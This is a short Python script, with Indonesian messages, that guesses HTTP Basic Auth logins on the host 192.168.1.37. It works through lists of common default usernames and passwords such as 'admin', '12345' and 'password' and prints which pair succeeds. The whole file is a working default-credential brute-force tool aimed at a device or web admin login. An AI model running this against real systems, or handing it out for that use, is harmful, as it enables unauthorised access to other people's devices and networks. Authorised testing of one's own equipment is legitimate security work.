import requests
from requests.auth import HTTPBasicAuth

ip = "192.168.1.37"
usernames = ["admin", "user",""]
passwords = ["admin", "12345", "password", "user",""]

for username in usernames:
    for password in passwords:
        response = requests.get(f"http://{ip}", auth=HTTPBasicAuth(username, password))
        if response.status_code == 200:
            print(f"Berhasil login dengan username: {username} dan password: {password}")
            break
        else:
            print(f"Gagal login dengan username: {username} dan password: {password}")